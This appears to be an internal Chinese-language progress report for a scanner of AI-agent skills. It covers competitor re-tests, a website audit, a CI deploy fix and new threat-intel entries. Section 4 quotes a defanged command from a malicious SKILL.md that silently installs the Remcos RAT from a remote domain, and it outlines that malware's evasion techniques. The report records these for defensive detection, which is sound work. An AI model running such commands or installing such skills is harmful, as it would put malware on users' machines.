# GAP-ROUND-17 — 深度对标：竞品复测、官网体验审计、新情报入库（2026-08-05）

参照物：ClawScan（upstream main）、skillgate.sh（npm `skillgate`）、公开威胁情报（Zscaler ThreatLabz、Unit 42、OWASP Agentic Skills Top 10）、官网/文档站真实移动端体验。

## 1. 竞品复测

| 参照物 | 实测方式 | 结果 |
| --- | --- | --- |
| skillgate.sh | `npm view skillgate version` | 仍为 0.2.1（连续第 7 轮无迭代，2026-03-13 后停更） |
| ClawScan | `git fetch origin main`（本地 clone） | HEAD 仍为 `b4d4470`，与 ROUND-16 一致；我们的 adapter 分支无需 rebase |
| corpus-smoke | `gh run list --workflow="Corpus smoke"` | 0 runs——workflow 于 2026-08-05 注册，首个 cron（每周一 06:17 UTC）尚未到达，下周一观察 |

## 2. 官网/文档站体验审计（真实移动端 390×844 + 桌面 1440×900 截图走查）

| 发现 | 现状 | 差距 | 级别 | 处置 |
| --- | --- | --- | --- | --- |
| `/docs/cli/openclaw-install-policy/` 线上 404 | #37 合并后 deploy job 失败，线上站停留在 #36 部署 | 已发布 0.7.0 的旗舰功能在官网文档 404 | **P0** | 修复 site.yml deploy（见 §3）+ 请负责人确认重部署 |
| 落地页 Quick start 仍是 `git clone + pnpm install` | README 早已改为 npm quick start | 文档与落地页不一致，新用户被引导走最慢路径 | **P0** | 落地页 hero 复制命令与终端示例改为 `npx skillwarden`，三步流程加入 install-time gate |
| 落地页未提及 install-time gate | 0.7.0 主打能力缺席首页 | 竞品（ClawScan）首页突出 install policy | P1 | 三步流程第 3 步改为 "Gate installs"（链接 openclaw-install-policy 文档） |
| 移动端整体 | 深色 hero、卡片、终端块在 390px 下无横向溢出，导航/字体正常 | 无 | — | 达标，无需改动 |

## 3. site.yml deploy 失败根因

`cloudflare/wrangler-action@v4` 在 runner 上以 `npx wrangler@4.119.0` 非交互执行，npm 因缺 `--yes` 拒绝安装：

```
npm error npx canceled due to missing packages and no YES option: ["wrangler@4.119.0"]
```

修复：deploy job 改为显式 `npx --yes wrangler@4.119.0 pages deploy ...`（env 注入 `CLOUDFLARE_API_TOKEN`/`CLOUDFLARE_ACCOUNT_ID`），不再依赖 action 的内部安装路径。注意：secrets 是否已配置在本次失败中未走到验证一步，合并后首个 main push 将给出权威答案。

## 4. 新公开威胁情报

- **入库 SKA-2026-0021**：Zscaler ThreatLabz（2026-05-05）DeepSeek-Claw——SKILL.md 内嵌 `msiexec /q /i https://cloudcraftshub[.]com/api` 静默安装 Remcos RAT（GoToMeeting 签名二进制 DLL sideload、ETW/AMSI 内存补丁、TEA 加密载荷），macOS/Linux 手动路径投递 GhostLoader。skills 名称 + `cloudcraftshub.com` 域名指标均可离线匹配（65 names / 8 domains）。
- Unit 42 2026-06-23《OpenClaw's Skill Marketplace and the Emerging AI Supply Chain Threat》复核：其 5 个 unblocked skills（tradingview 双子、omnicogg、money-radar、letssendit）已全部被 SKA-2026-0010/0011/0012/0013 覆盖，无需新增。
- OWASP **Agentic Skills Top 10** 已发布（AST01 Malicious Skills / AST02 Supply Chain Compromise 均引用 ClawHavoc/ClawHub 案例）——后续轮次可在 THREAT-MODEL 与规则文档中映射 AST 编号（P2，本轮不做）。

## 5. 结论（"实际体验能像最好的竞品一样优秀吗"）

- 检测面与情报库：持平或领先（竞品 skillgate.sh 停更；ClawScan 无新能力）。
- 官网体验：本轮修复前 **不达标**（旗舰功能文档 404 + 落地页 quick start 过时）；本轮修复后待重部署验证。
- 剩余外部项不变：corpus-smoke 周一首跑、npm Trusted Publisher、上游 clawscan PR、真实 OpenClaw Gateway 集成。
